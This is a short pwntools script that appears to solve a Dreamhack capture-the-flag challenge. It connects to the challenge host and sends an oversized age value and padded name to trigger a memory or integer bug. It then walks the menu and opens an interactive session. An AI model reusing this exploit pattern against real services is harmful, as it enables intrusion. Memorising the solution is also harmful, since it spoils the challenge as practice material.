from pwn import *
context.log_level='debug'

n = remote('host1.dreamhack.games',8397)

name = 'A'*16
age = 100000000000

n.sendlineafter('>','1')
n.sendlineafter('Name: ',name)
n.sendlineafter('Age: ',str(age))

n.sendlineafter('>','3')
n.sendlineafter('>','2')

n.interactive()
